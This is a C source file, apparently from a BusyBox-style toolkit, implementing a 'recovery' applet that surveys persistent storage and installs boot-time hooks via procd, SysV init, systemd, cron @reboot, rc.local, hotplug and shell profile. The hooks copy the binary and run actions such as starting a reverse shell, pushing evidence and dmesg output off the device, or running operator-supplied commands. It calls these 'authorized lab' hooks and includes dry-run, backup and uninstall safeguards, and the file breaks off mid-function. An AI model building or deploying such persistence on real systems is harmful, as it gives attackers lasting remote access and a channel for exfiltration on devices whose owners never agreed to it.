#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include "applets.h"
#include "json_helpers.h"

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#ifndef BB_RECOVERY_BINARY_NAME
#define BB_RECOVERY_BINARY_NAME "busierbox_recovery"
#endif

struct recovery_method {
    const char *name;
    const char *path;
    const char *kind;
    const char *survives_reboot;
    const char *intrusiveness;
    const char *reversibility;
    const char *requires_external_write;
};

static const struct recovery_method recovery_methods[] = {
    {"openwrt-procd", "etc/init.d/busierbox_recovery", "OpenWrt/procd init script", "yes", "medium", "backup/remove script", "yes"},
    {"sysv-init", "etc/rc.d/S99busierbox_recovery", "SysV init.d/rcS hook", "yes", "medium", "backup/remove script", "yes"},
    {"systemd-unit", "etc/systemd/system/busierbox-recovery.service", "systemd unit", "yes", "medium", "backup/remove unit", "yes"},
    {"cron-reboot", "etc/crontabs/root", "cron @reboot line", "yes", "medium", "remove marked block", "yes"},
    {"at-job", "var/spool/at", "at job spool", "maybe", "high", "manual/provider-specific", "yes"},
    {"rc-local", "etc/rc.local", "rc.local marked block", "yes", "low", "remove marked block", "yes"},
    {"hotplug-iface", "etc/hotplug.d/iface/99-busierbox-recovery", "OpenWrt hotplug.d iface hook", "event", "medium", "remove script", "yes"},
    {"profile", "etc/profile.d/busierbox-recovery.sh", "shell profile hook", "login-only", "low", "remove script", "yes"},
};

struct recovery_storage {
    const char *path;
    const char *class_name;
    const char *survives_reboot;
    const char *notes;
};

static const struct recovery_storage recovery_storage_paths[] = {
    {"/overlay", "persistent", "yes", "OpenWrt writable overlay when present"},
    {"/root", "persistent", "yes", "root home on most installed systems"},
    {"/etc", "persistent", "yes", "configuration partition/rootfs overlay"},
    {"/usr/bin", "persistent", "yes", "binary location when rootfs is writable"},
    {"/tmp", "volatile", "no", "tmpfs on OpenWrt and most embedded Linux targets"},
    {"/var/tmp", "usually-volatile", "maybe", "may be tmpfs or persistent depending on target"},
    {"/dev/shm", "volatile", "no", "tmpfs shared memory"},
};

static int is_help(int argc, char **argv)
{
    return argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help") || !strcmp(argv[1], "help"));
}

static int path_exists(const char *path)
{
    return access(path, F_OK) == 0;
}

static const char *payload_base_name(const char *path)
{
    const char *slash;
    if (!path || !*path)
        return "persistence";
    slash = strrchr(path, '/');
    return slash ? slash + 1 : path;
}

static const struct recovery_method *find_recovery_method(const char *name)
{
    size_t i;
    if (!strcmp(name, "procd"))
        name = "openwrt-procd";
    else if (!strcmp(name, "rcS"))
        name = "sysv-init";
    else if (!strcmp(name, "systemd"))
        name = "systemd-unit";
    else if (!strcmp(name, "cron"))
        name = "cron-reboot";
    else if (!strcmp(name, "rc.local"))
        name = "rc-local";
    else if (!strcmp(name, "hotplug"))
        name = "hotplug-iface";
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++)
        if (!strcmp(recovery_methods[i].name, name))
            return &recovery_methods[i];
    return NULL;
}

static const char *recovery_action_category(const char *action)
{
    if (!strcmp(action, "evidence-push") || !strcmp(action, "evidence-then-rshell") || !strcmp(action, "dmesg-push"))
        return "evidence";
    if (!strcmp(action, "rshell"))
        return "reverse-shell";
    if (!strcmp(action, "command"))
        return "command";
    if (!strcmp(action, "script"))
        return "script";
    return "status";
}

static int recovery_action_uploads_evidence(const char *action)
{
    return !strcmp(action, "evidence-push") || !strcmp(action, "evidence-then-rshell") || !strcmp(action, "dmesg-push");
}

static int recovery_action_collects_dmesg(const char *action)
{
    return !strcmp(action, "dmesg-push");
}

static int recovery_action_starts_rshell(const char *action)
{
    return !strcmp(action, "rshell") || !strcmp(action, "evidence-then-rshell");
}

static int recovery_action_starts_rshell_after_evidence(const char *action)
{
    return !strcmp(action, "evidence-then-rshell");
}

static int recovery_action_executes_operator_supplied_command(const char *action)
{
    return !strcmp(action, "command") || !strcmp(action, "script");
}

static void recovery_join(char *out, size_t outsz, const char *root, const char *rel)
{
    if (!root || !*root || !strcmp(root, "/"))
        snprintf(out, outsz, "/%s", rel);
    else
        snprintf(out, outsz, "%s/%s", root, rel);
}

static void recovery_bin_path(char *out, size_t outsz, const char *root, const char *name)
{
    char rel[PATH_MAX];
    snprintf(rel, sizeof(rel), "usr/bin/%s", name);
    recovery_join(out, outsz, root, rel);
}

static void recovery_script_path(char *out, size_t outsz, const char *root, const char *name)
{
    char rel[PATH_MAX];
    snprintf(rel, sizeof(rel), "usr/bin/%s.recovery.sh", name);
    recovery_join(out, outsz, root, rel);
}

static void fprint_shell_quoted(FILE *fp, const char *s)
{
    fputc('\'', fp);
    for (; s && *s; s++) {
        if (*s == '\'')
            fputs("'\\''", fp);
        else
            fputc(*s, fp);
    }
    fputc('\'', fp);
}

static int file_is_empty_or_missing(const char *path)
{
    struct stat st;
    if (stat(path, &st) != 0)
        return errno == ENOENT ? 1 : 0;
    return st.st_size == 0;
}

static int copy_self_to(const char *dst, const char *argv0)
{
    char src[PATH_MAX];
    FILE *in, *out;
    char buf[8192];
    size_t n;
    ssize_t len = readlink("/proc/self/exe", src, sizeof(src) - 1);

    if (len < 0) {
        if (!argv0 || !*argv0)
            return -1;
        snprintf(src, sizeof(src), "%s", argv0);
    } else {
        src[len] = '\0';
    }
    in = fopen(src, "rb");
    if (!in)
        return -1;
    out = fopen(dst, "wb");
    if (!out) {
        fclose(in);
        return -1;
    }
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        if (fwrite(buf, 1, n, out) != n) {
            fclose(in);
            fclose(out);
            return -1;
        }
    }
    fclose(in);
    if (fclose(out) != 0)
        return -1;
    chmod(dst, 0755);
    return 0;
}

static int copy_file_path(const char *src, const char *dst)
{
    FILE *in, *out;
    char buf[8192];
    size_t n;
    in = fopen(src, "rb");
    if (!in)
        return -1;
    out = fopen(dst, "wb");
    if (!out) {
        fclose(in);
        return -1;
    }
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        if (fwrite(buf, 1, n, out) != n) {
            fclose(in);
            fclose(out);
            return -1;
        }
    }
    fclose(in);
    return fclose(out);
}

static int shell_name_safe(const char *s)
{
    size_t i;
    if (!s || !*s)
        return 0;
    for (i = 0; s[i]; i++) {
        unsigned char c = (unsigned char)s[i];
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '_' || c == '-' || c == '.'))
            return 0;
    }
    return 1;
}

static int backup_existing_file(const char *path, char *backup, size_t backupsz)
{
    struct stat st;
    if (stat(path, &st) != 0)
        return 0;
    snprintf(backup, backupsz, "%s.busierbox.bak.%ld", path, (long)time(NULL));
    if (copy_file_path(path, backup) != 0)
        return -1;
    chmod(backup, st.st_mode & 0777);
    return 1;
}

static int append_recovery_block(const char *path, const char *method, const char *name,
                                 const char *action, const char *command)
{
    FILE *fp = fopen(path, "a");
    if (!fp)
        return -1;
    if (file_is_empty_or_missing(path)) {
        if (!strcmp(method, "openwrt-procd"))
            fputs("#!/bin/sh /etc/rc.common\nSTART=99\n\n", fp);
        else if (!strcmp(method, "sysv-init") || !strcmp(method, "rc-local") || !strcmp(method, "hotplug-iface") || !strcmp(method, "profile"))
            fputs("#!/bin/sh\n", fp);
    }
    fprintf(fp, "\n# BEGIN BUSIERBOX RECOVERY %s\n", name);
    fprintf(fp, "# method=%s; action=%s; authorized lab persistence/recovery hook\n", method, action);
    fprintf(fp, "# generated_command=%s\n", command);
    if (!strcmp(method, "cron-reboot")) {
        fputs("@reboot /bin/sh -c ", fp);
        fprint_shell_quoted(fp, command);
        fputs(" >/dev/null 2>&1\n", fp);
    }
    else if (!strcmp(method, "systemd-unit")) {
        fputs("[Unit]\nDescription=BusierBox authorized lab recovery action\n[Service]\nType=oneshot\nExecStart=/bin/sh -c ", fp);
        fprint_shell_quoted(fp, command);
        fputs("\n[Install]\nWantedBy=multi-user.target\n", fp);
    } else if (!strcmp(method, "openwrt-procd")) {
        fputs("start_service() {\n    /bin/sh -c ", fp);
        fprint_shell_quoted(fp, command);
        fputs(" >/dev/null 2>&1 &\n}\n", fp);
    } else {
        fputs("/bin/sh -c ", fp);
        fprint_shell_quoted(fp, command);
        fputs(" >/dev/null 2>&1 || true\n", fp);
    }
    fprintf(fp, "# END BUSIERBOX RECOVERY %s\n", name);
    return fclose(fp);
}

static int remove_recovery_block(const char *path, const char *name)
{
    char begin[256], end[256], tmp[PATH_MAX];
    FILE *in, *out;
    char line[4096];
    int skipping = 0, removed = 0;

    snprintf(begin, sizeof(begin), "BEGIN BUSIERBOX RECOVERY %s", name);
    snprintf(end, sizeof(end), "END BUSIERBOX RECOVERY %s", name);
    snprintf(tmp, sizeof(tmp), "%s.tmp.%ld", path, (long)getpid());
    in = fopen(path, "r");
    if (!in)
        return errno == ENOENT ? 0 : -1;
    out = fopen(tmp, "w");
    if (!out) {
        fclose(in);
        return -1;
    }
    while (fgets(line, sizeof(line), in)) {
        if (strstr(line, begin)) {
            skipping = 1;
            removed = 1;
            continue;
        }
        if (skipping) {
            if (strstr(line, end))
                skipping = 0;
            continue;
        }
        fputs(line, out);
    }
    fclose(in);
    if (fclose(out) != 0)
        return -1;
    if (!removed) {
        unlink(tmp);
        return 0;
    }
    if (rename(tmp, path) != 0) {
        unlink(tmp);
        return -1;
    }
    return 0;
}

static int recovery_status_one(const char *root, const struct recovery_method *m, const char *name,
                               char *action, size_t actionsz,
                               char *command, size_t commandsz)
{
    char path[PATH_MAX];
    char marker[256];
    char *text;
    char *begin, *end, *line;
    recovery_join(path, sizeof(path), root, m->path);
    snprintf(marker, sizeof(marker), "BEGIN BUSIERBOX RECOVERY %s", name);
    text = bb_read_text_file(path, 1024 * 1024);
    if (!text)
        return 0;
    begin = strstr(text, marker);
    if (begin) {
        end = strstr(begin, "END BUSIERBOX RECOVERY");
        if (action && actionsz)
            action[0] = '\0';
        if (command && commandsz)
            command[0] = '\0';
        line = begin;
        while (line && (!end || line < end)) {
            char *next = strchr(line, '\n');
            if (next)
                *next = '\0';
            if (action && actionsz) {
                char *p = strstr(line, "action=");
                if (p) {
                    char *q;
                    p += 7;
                    q = strchr(p, ';');
                    if (!q)
                        q = p + strcspn(p, " \t\r\n");
                    snprintf(action, actionsz, "%.*s", (int)(q - p), p);
                }
            }
            if (command && commandsz) {
                const char *p = strstr(line, "# generated_command=");
                if (p)
                    snprintf(command, commandsz, "%s", p + 20);
            }
            if (!next)
                break;
            *next = '\n';
            line = next + 1;
        }
        free(text);
        return 1;
    }
    free(text);
    return 0;
}

static int recovery_status_index_match(const char *kind, const struct recovery_method *m,
                                       const char *action, const char *value)
{
    char key[128];
    if (!strcmp(kind, "method"))
        return !strcmp(m->name, value);
    if (!strcmp(kind, "action"))
        return !strcmp(action, value);
    if (!strcmp(kind, "category"))
        return !strcmp(recovery_action_category(action), value);
    if (!strcmp(kind, "method_action")) {
        snprintf(key, sizeof(key), "%s:%s", m->name, action);
        return !strcmp(key, value);
    }
    if (!strcmp(kind, "category_action")) {
        snprintf(key, sizeof(key), "%s:%s", recovery_action_category(action), action);
        return !strcmp(key, value);
    }
    return 0;
}

static int recovery_print_status_index_array(const char *root, const char *name,
                                             const char *kind, const char *value)
{
    size_t j;
    int installed_index = 0;
    int first = 1;
    int matched = 0;

    fputc('[', stdout);
    for (j = 0; j < sizeof(recovery_methods) / sizeof(recovery_methods[0]); j++) {
        char action[64], generated[PATH_MAX * 2];
        if (!recovery_status_one(root, &recovery_methods[j], name, action, sizeof(action), generated, sizeof(generated)))
            continue;
        if (recovery_status_index_match(kind, &recovery_methods[j], action[0] ? action : "unknown", value)) {
            printf("%s%d", first ? "" : ",", installed_index);
            first = 0;
            matched = 1;
        }
        installed_index++;
    }
    fputc(']', stdout);
    return matched;
}

static int recovery_status_index_has_match(const char *root, const char *name,
                                           const char *kind, const char *value)
{
    size_t j;
    for (j = 0; j < sizeof(recovery_methods) / sizeof(recovery_methods[0]); j++) {
        char action[64], generated[PATH_MAX * 2];
        if (!recovery_status_one(root, &recovery_methods[j], name, action, sizeof(action), generated, sizeof(generated)))
            continue;
        if (recovery_status_index_match(kind, &recovery_methods[j], action[0] ? action : "unknown", value))
            return 1;
    }
    return 0;
}

static void recovery_print_status_indexes(const char *root, const char *name)
{
    static const char *actions[] = {
        "status-only", "rshell", "evidence-push", "evidence-then-rshell",
        "dmesg-push", "command", "script", "unknown", NULL
    };
    static const char *categories[] = {
        "status", "reverse-shell", "evidence", "command", "script", NULL
    };
    size_t i;
    int first;

    fputs(",\"installations_by_method\":{", stdout);
    first = 1;
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
        if (!recovery_status_index_has_match(root, name, "method", recovery_methods[i].name))
            continue;
        fputs(first ? "" : ",", stdout);
        bb_json_string(stdout, recovery_methods[i].name);
        fputc(':', stdout);
        recovery_print_status_index_array(root, name, "method", recovery_methods[i].name);
        first = 0;
    }
    fputs("}", stdout);
    fputs(",\"installations_by_action\":{", stdout);
    first = 1;
    for (i = 0; actions[i]; i++) {
        if (!recovery_status_index_has_match(root, name, "action", actions[i]))
            continue;
        fputs(first ? "" : ",", stdout);
        bb_json_string(stdout, actions[i]);
        fputc(':', stdout);
        recovery_print_status_index_array(root, name, "action", actions[i]);
        first = 0;
    }
    fputs("}", stdout);
    fputs(",\"installations_by_category\":{", stdout);
    first = 1;
    for (i = 0; categories[i]; i++) {
        if (!recovery_status_index_has_match(root, name, "category", categories[i]))
            continue;
        fputs(first ? "" : ",", stdout);
        bb_json_string(stdout, categories[i]);
        fputc(':', stdout);
        recovery_print_status_index_array(root, name, "category", categories[i]);
        first = 0;
    }
    fputs("}", stdout);
    fputs(",\"installations_by_method_action\":{", stdout);
    first = 1;
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
        size_t a;
        for (a = 0; actions[a]; a++) {
            char key[128];
            snprintf(key, sizeof(key), "%s:%s", recovery_methods[i].name, actions[a]);
            if (!recovery_status_index_has_match(root, name, "method_action", key))
                continue;
            fputs(first ? "" : ",", stdout);
            bb_json_string(stdout, key);
            fputc(':', stdout);
            recovery_print_status_index_array(root, name, "method_action", key);
            first = 0;
        }
    }
    fputs("}", stdout);
    fputs(",\"installations_by_category_action\":{", stdout);
    first = 1;
    for (i = 0; categories[i]; i++) {
        size_t a;
        for (a = 0; actions[a]; a++) {
            char key[128];
            snprintf(key, sizeof(key), "%s:%s", categories[i], actions[a]);
            if (!recovery_status_index_has_match(root, name, "category_action", key))
                continue;
            fputs(first ? "" : ",", stdout);
            bb_json_string(stdout, key);
            fputc(':', stdout);
            recovery_print_status_index_array(root, name, "category_action", key);
            first = 0;
        }
    }
    fputs("}", stdout);
}

static void recovery_print_status_api_collections(void)
{
    fputs(",\"api_collections\":{\"installations\":{\"name\":\"installations\",\"count_summary_key\":\"summary.installation_count\",\"indexes\":[", stdout);
    fputs("\"installations_by_method\",", stdout);
    fputs("\"installations_by_action\",", stdout);
    fputs("\"installations_by_category\",", stdout);
    fputs("\"installations_by_method_action\",", stdout);
    fputs("\"installations_by_category_action\"", stdout);
    fputs("]}}", stdout);
}

static void recovery_print_survey_index_array(const char *collection, const char *field, const char *value)
{
    size_t i;
    int first = 1;

    fputc('[', stdout);
    if (!strcmp(collection, "storage")) {
        for (i = 0; i < sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]); i++) {
            const char *candidate = "";
            if (!strcmp(field, "class"))
                candidate = recovery_storage_paths[i].class_name;
            else if (!strcmp(field, "survives_reboot"))
                candidate = recovery_storage_paths[i].survives_reboot;
            if (strcmp(candidate, value))
                continue;
            printf("%s%zu", first ? "" : ",", i);
            first = 0;
        }
    } else if (!strcmp(collection, "methods")) {
        for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
            const char *candidate = "";
            if (!strcmp(field, "name"))
                candidate = recovery_methods[i].name;
            else if (!strcmp(field, "survives_reboot"))
                candidate = recovery_methods[i].survives_reboot;
            else if (!strcmp(field, "intrusiveness"))
                candidate = recovery_methods[i].intrusiveness;
            else if (!strcmp(field, "requires_external_write"))
                candidate = recovery_methods[i].requires_external_write;
            if (strcmp(candidate, value))
                continue;
            printf("%s%zu", first ? "" : ",", i);
            first = 0;
        }
    }
    fputc(']', stdout);
}

static void recovery_print_survey_indexes(void)
{
    static const char *storage_classes[] = {"persistent", "volatile", "usually-volatile", NULL};
    static const char *storage_survives[] = {"yes", "no", "maybe", NULL};
    static const char *method_survives[] = {"yes", "event", "login-only", "maybe", NULL};
    static const char *method_intrusiveness[] = {"low", "medium", "high", NULL};
    static const char *method_external_write[] = {"yes", "no", NULL};
    size_t i;

    fputs(",\"storage_by_class\":{", stdout);
    for (i = 0; storage_classes[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, storage_classes[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("storage", "class", storage_classes[i]);
    }
    fputs("},\"storage_by_survives_reboot\":{", stdout);
    for (i = 0; storage_survives[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, storage_survives[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("storage", "survives_reboot", storage_survives[i]);
    }
    fputs("},\"methods_by_name\":{", stdout);
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, recovery_methods[i].name);
        fputc(':', stdout);
        recovery_print_survey_index_array("methods", "name", recovery_methods[i].name);
    }
    fputs("},\"methods_by_survives_reboot\":{", stdout);
    for (i = 0; method_survives[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, method_survives[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("methods", "survives_reboot", method_survives[i]);
    }
    fputs("},\"methods_by_intrusiveness\":{", stdout);
    for (i = 0; method_intrusiveness[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, method_intrusiveness[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("methods", "intrusiveness", method_intrusiveness[i]);
    }
    fputs("},\"methods_by_requires_external_write\":{", stdout);
    for (i = 0; method_external_write[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, method_external_write[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("methods", "requires_external_write", method_external_write[i]);
    }
    fputs("}", stdout);
}

static void recovery_print_survey_api_collections(void)
{
    fputs(",\"api_collections\":{", stdout);
    fputs("\"storage\":{\"name\":\"storage\",\"count_summary_key\":\"summary.storage_count\",\"indexes\":[", stdout);
    fputs("\"storage_by_class\",\"storage_by_survives_reboot\"", stdout);
    fputs("]},\"methods\":{\"name\":\"methods\",\"count_summary_key\":\"summary.method_count\",\"indexes\":[", stdout);
    fputs("\"methods_by_name\",\"methods_by_survives_reboot\",\"methods_by_intrusiveness\",\"methods_by_requires_external_write\"", stdout);
    fputs("]}}", stdout);
}

static void recovery_print_survey(int json, const char *root)
{
    size_t i;
    if (json) {
        fputs("{\"schema\":1,\"mode\":\"survey\",\"root\":", stdout);
        bb_json_string(stdout, root);
        fputs(",\"storage\":[", stdout);
        for (i = 0; i < sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]); i++) {
            char path[PATH_MAX];
            recovery_join(path, sizeof(path), root, recovery_storage_paths[i].path + 1);
            printf("%s{\"path\":", i ? "," : "");
            bb_json_string(stdout, path);
            fputs(",\"class\":", stdout); bb_json_string(stdout, recovery_storage_paths[i].class_name);
            fputs(",\"survives_reboot\":", stdout); bb_json_string(stdout, recovery_storage_paths[i].survives_reboot);
            printf(",\"present\":%s,\"writable\":%s", path_exists(path) ? "true" : "false", access(path, W_OK) == 0 ? "true" : "false");
            fputs(",\"notes\":", stdout); bb_json_string(stdout, recovery_storage_paths[i].notes);
            fputc('}', stdout);
        }
        fputs("],\"methods\":[", stdout);
        for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
            char path[PATH_MAX];
            recovery_join(path, sizeof(path), root, recovery_methods[i].path);
            printf("%s{\"name\":", i ? "," : "");
            bb_json_string(stdout, recovery_methods[i].name);
            fputs(",\"kind\":", stdout); bb_json_string(stdout, recovery_methods[i].kind);
            fputs(",\"path\":", stdout); bb_json_string(stdout, path);
            printf(",\"present\":%s", path_exists(path) ? "true" : "false");
            fputs(",\"survives_reboot\":", stdout); bb_json_string(stdout, recovery_methods[i].survives_reboot);
            fputs(",\"intrusiveness\":", stdout); bb_json_string(stdout, recovery_methods[i].intrusiveness);
            fputs(",\"reversibility\":", stdout); bb_json_string(stdout, recovery_methods[i].reversibility);
            fputs(",\"requires_external_write\":", stdout); bb_json_string(stdout, recovery_methods[i].requires_external_write);
            fputc('}', stdout);
        }
        fputs("]", stdout);
        recovery_print_survey_indexes();
        recovery_print_survey_api_collections();
        printf(",\"summary\":{\"storage_count\":%zu,\"method_count\":%zu}}\n",
               sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]),
               sizeof(recovery_methods) / sizeof(recovery_methods[0]));
        return;
    }
    puts("Persistence survey");
    printf("  root: %s\n\n", root);
    puts("Safety policy");
    puts("  survey/plan: no target modification");
    puts("  install: requires --method and --apply");
    puts("  real-root writes: require --external --apply");
    puts("  intrusive operations: marked in the method table");
    puts("");
    puts("Storage candidates");
    printf("  %-18s %-17s %-7s %-8s %-8s %s\n",
           "Path", "Class", "Present", "Writable", "Survives", "Notes");
    for (i = 0; i < sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]); i++) {
        char path[PATH_MAX];
        recovery_join(path, sizeof(path), root, recovery_storage_paths[i].path + 1);
        printf("  %-18s %-17s %-7s %-8s %-8s %s\n",
               path, recovery_storage_paths[i].class_name, path_exists(path) ? "yes" : "no",
               access(path, W_OK) == 0 ? "yes" : "no", recovery_storage_paths[i].survives_reboot,
               recovery_storage_paths[i].notes);
    }
    puts("");
    puts("Persistence methods");
    printf("  %-15s %-44s %-7s %-9s %s\n",
           "Method", "Path", "Present", "Intrusive", "Reversible");
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
        char path[PATH_MAX];
        recovery_join(path, sizeof(path), root, recovery_methods[i].path);
        printf("  %-15s %-44s %-7s %-9s %s\n",
               recovery_methods[i].name, path, path_exists(path) ? "yes" : "no",
               recovery_methods[i].intrusiveness,
               recovery_methods[i].reversibility);
    }
}

static int applet_recovery_install(int argc, char **argv, int uninstall, const char *applet)
{
    const char *root = "/";
    const char *method = NULL;
    const char *action = "status-only";
    const char *name = BB_RECOVERY_BINARY_NAME;
    const char *script_file = NULL;
    int dry_run = 0, apply = 0, external = 0;
    const struct recovery_method *m;
    char hook[PATH_MAX], bin[PATH_MAX], script_dst[PATH_MAX], bindir[PATH_MAX], backup[PATH_MAX];
    char generated[PATH_MAX * 2];
    int backup_status;
    int i;

    generated[0] = '\0';
    for (i = 2; i < argc; i++) {
        if (!strcmp(argv[i], "--dry-run"))
            dry_run = 1;
        else if (!strcmp(argv[i], "--apply"))
            apply = 1;
        else if (!strcmp(argv[i], "--external"))
            external = 1;
        else if (!strcmp(argv[i], "--root") && i + 1 < argc)
            root = argv[++i];
        else if (!strcmp(argv[i], "--method") && i + 1 < argc)
            method = argv[++i];
        else if (!strcmp(argv[i], "--action") && i + 1 < argc)
            action = argv[++i];
        else if (!strcmp(argv[i], "--name") && i + 1 < argc)
            name = argv[++i];
        else if (!strcmp(argv[i], "--file") && i + 1 < argc)
            script_file = argv[++i];
        else if (!strcmp(argv[i], "--")) {
            int j;
            generated[0] = '\0';
            for (j = i + 1; j < argc; j++) {
                if (generated[0])
                    strncat(generated, " ", sizeof(generated) - strlen(generated) - 1);
                strncat(generated, argv[j], sizeof(generated) - strlen(generated) - 1);
            }
            break;
        }
        else {
            fprintf(stderr, "%s: unknown or incomplete option %s\n", applet, argv[i]);
            return 2;
        }
    }
    if (!method) {
        fprintf(stderr, "%s: install/uninstall requires --method\n", applet);
        return 2;
    }
    m = find_recovery_method(method);
    if (!m) {
        fprintf(stderr, "%s: unsupported method %s\n", applet, method);
        return 2;
    }
    if (strcmp(action, "rshell") && strcmp(action, "command") && strcmp(action, "script") &&
        strcmp(action, "status-only") && strcmp(action, "evidence-push") &&
        strcmp(action, "evidence-then-rshell") && strcmp(action, "dmesg-push")) {
        fprintf(stderr, "%s: unsupported recovery action %s\n", applet, action);
        return 2;
    }
    if (!shell_name_safe(name)) {
        fprintf(stderr, "%s: recovery name must use letters, numbers, dot, dash, or underscore\n", applet);
        return 2;
    }
    recovery_join(hook, sizeof(hook), root, m->path);
    recovery_bin_path(bin, sizeof(bin), root, name);
    recovery_script_path(script_dst, sizeof(script_dst), root, name);
    if (!strcmp(action, "rshell"))
        snprintf(generated, sizeof(generated), "/usr/bin/%s rshell start", name);
    else if (!strcmp(action, "evidence-push"))
        snprintf(generated, sizeof(generated), "/usr/bin/%s evidence push --quiet", name);
    else if (!strcmp(action, "evidence-then-rshell"))
        snprintf(generated, sizeof(generated), "/usr/bin/%s evidence push --quiet && /usr/bin/%s rshell start", name, name);
    else if (!strcmp(action, "dmesg-push"))
        snprintf(generated, sizeof(generated), "bbx_dmesg_dir=%s/run; mkdir -p \"$bbx_dmesg_dir\" 2>/dev/null || bbx_dmesg_dir=.; bbx_dmesg=\"$bbx_dmesg_dir/%s-dmesg.txt\"; dmesg >\"$bbx_dmesg\" 2>&1; /usr/bin/%s evidence push \"$bbx_dmesg\" --dest %s-dmesg.txt --quiet; rm -f \"$bbx_dmesg\"", BB_RUNTIME_ROOT, name, name, name);
    else if (!strcmp(action, "script")) {
        if (!script_file || !*script_file) {
            fprintf(stderr, "%s: recovery action script requires --file FILE\n", applet);
            return 2;
        }
        snprintf(generated, sizeof(generated), "/usr/bin/%s.recovery.sh", name);
    } else if (!strcmp(action, "command")) {
        if (!generated[0]) {
            fprintf(stderr, "%s: recovery action command requires -- COMMAND\n", applet);
            return 2;
        }
    } else {
        snprintf(generated, sizeof(generated), "/usr/bin/%s persistence status", name);
    }
    snprintf(bindir, sizeof(bindir), "%s", bin);
    {
        char *slash = strrchr(bindir, '/');
        if (slash)
            *slash = '\0';
    }
    if (!dry_run && !apply) {
        fprintf(stderr, "%s: modifying actions require --apply; use --dry-run to preview\n", applet);
        return 2;
    }
    if (!strcmp(root, "/") && apply && !external) {
        fprintf(stderr, "%s: real-root install/uninstall requires --external --apply\n", applet);
        return 2;
    }
    if (dry_run) {
        printf("Would %s persistence method=%s name=%s root=%s\n", uninstall ? "uninstall" : "install", method, name, root);
        printf("Action: %s\n", action);
        printf("Generated command: %s\n", generated);
        printf("Would %s binary: %s\n", uninstall ? "remove" : "copy self to", bin);
        if (!strcmp(action, "script"))
            printf("Would %s script: %s from %s\n", uninstall ? "remove" : "copy", script_dst, script_file);
        printf("Would %s hook: %s\n", uninstall ? "remove marked block/file" : "write marked hook", hook);
        if (!uninstall && path_exists(hook))
            printf("Would backup existing hook before modification: %s.busierbox.bak.<timestamp>\n", hook);
        return 0;
    }
    if (uninstall) {
        bb_ledger_record("remove", hook, !strcmp(root, "/") ? "external" : "recovery-fakeroot", "recovery uninstall hook");
        bb_ledger_record("remove", bin, !strcmp(root, "/") ? "external" : "recovery-fakeroot", "recovery uninstall binary");
        bb_ledger_record("remove", script_dst, !strcmp(root, "/") ? "external" : "recovery-fakeroot", "recovery uninstall script");
        remove_recovery_block(hook, name);
        unlink(bin);
        unlink(script_dst);
        printf("%s: uninstalled method=%s name=%s\n", applet, method, name);
        return 0;
    }
    if (bb_mkdir_p(bindir, 0755) != 0) {
        fprintf(stderr, "%s: cannot create %s: %s\n", applet, bindir, strerror(errno));
        return 1;
    }
    if (copy_self_to(bin, argc > 0 ? argv[0] : NULL) != 0) {
        fprintf(stderr, "%s: cannot copy binary to %s: %s\n", applet, bin, strerror(errno));
        return 1;
    }
    if (!strcmp(action, "script")) {
        if (copy_file_path(script_file, script_dst) != 0) {
            fprintf(stderr, "%s: cannot copy script %s to %s: %s\n", applet, script_file, script_dst, strerror(errno));
            return 1;
        }
        chmod(script_dst, 0755);
    }
    {
        char hookdir[PATH_MAX];
        char *slash;
        snprintf(hookdir, sizeof(hookdir), "%s", hook);
        slash = strrchr(hookdir, '/');
        if (slash) {
            *slash = '\0';
            bb_mkdir_p(hookdir, 0755);
        }
    }
    backup[0] = '\0';
    if (remove_recovery_block(hook, name) != 0) {
        fprintf(stderr, "%s: cannot replace existing hook block in %s: %s\n", applet, hook, strerror(errno));
        return 1;
    }
    backup_status = backup_existing_file(hook, backup, sizeof(backup));
    if (backup_status < 0) {
        fprintf(stderr, "%s: cannot backup hook %s: %s\n", applet, hook, strerror(errno));
        return 1;
    }
    if (backup_status > 0)
        bb_ledger_record("backup", backup, !strcmp(root, "/") ? "external" : "recovery-fakeroot", hook);
    if (append_recovery_block(hook, method, name, action, generated) != 0) {
        fprintf(stderr, "%s: cannot write hook %s: %s\n", applet, hook, strerror(errno));
        return 1;
    }
    chmod(hook, 0755);
    {
        char detail[PATH_MAX * 2];
        snprintf(detail, sizeof(detail), "recovery binary method=%s action=%s name=%s", m->name, action, name);
        bb_ledger_record("write", bin, !strcmp(root, "/") ? "external" : "recovery-fakeroot", detail);
        if (!strcmp(action, "script")) {
            snprintf(detail, sizeof(detail), "recovery script method=%s action=%s name=%s source=%s", m->name, action, name, script_file);
            bb_ledger_record("write", script_dst, !strcmp(root, "/") ? "external" : "recovery-fakeroot", detail);
        }
        snprintf(detail, sizeof(detail), "recovery marked hook method=%s action=%s name=%s command=%s backup=%s", m->name, action, name, generated, backup_status > 0 ? backup : "none");
